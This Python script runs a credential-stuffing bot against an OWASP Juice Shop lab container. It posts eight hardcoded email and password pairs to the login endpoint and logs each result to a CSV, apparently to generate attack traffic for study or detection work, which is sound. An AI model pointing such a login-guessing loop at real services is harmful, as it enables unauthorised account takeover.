import os
import requests
import time
import csv
import socket

JUICESHOP_URL = os.getenv("JUICESHOP_URL", "http://juice-shop:3000")
LOGIN_ENDPOINT = f"{JUICESHOP_URL}/rest/user/login"
VICTIM_IP = os.getenv("VICTIM_IP", "juice-shop")

credentials = [
    ("admin@juice-sh.op", "admin123"),
    ("user1@juice-sh.op", "password"),
    ("bender@juice-sh.op", "insane"),
    ("jim@juice-sh.op", "ncc-1701"),
    ("mc.safesearch@juice-sh.op", "6ed4078"),
    ("test@test.com", "test1234"),
    ("root@juice-sh.op", "root"),
    ("guest@juice-sh.op", "guest")
]

output_file = "/data/bot_attempts.csv"

# 1. Wait for Juice Shop to be ready
print("[*] Waiting for juiceshop:3000 to be ready...")
while True:
    try:
        with socket.create_connection((VICTIM_IP, 3000), timeout=2):
            print("[+] Juiceshop is up!")
            break
    except (socket.timeout, ConnectionRefusedError):
        time.sleep(2)

# 2. Start Bot Attack (Credential Stuffing)
print("[*] Starting Credential Stuffing Bot Attack...")
results = []

for email, password in credentials:
    payload = {"email": email, "password": password}
    start_time = time.time()
    try:
        response = requests.post(LOGIN_ENDPOINT, json=payload)
        end_time = time.time()
        
        results.append({
            "timestamp": start_time,
            "attack_type": "Bot (Credential Stuffing)",
            "username": email,
            "http_status": response.status_code,
            "response_time": round(end_time - start_time, 4)
        })
        print(f"[+] Attempt: {email} | Status: {response.status_code}")
    except Exception as e:
        print(f"[-] Request failed for {email}: {e}")
    
    time.sleep(0.5) # Fast but not instant to simulate a bot

# 3. Save Raw Results
with open(output_file, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=["timestamp", "attack_type", "username", "http_status", "response_time"])
    writer.writeheader()
    writer.writerows(results)

print("[+] Bot attack completed. Raw data saved.")
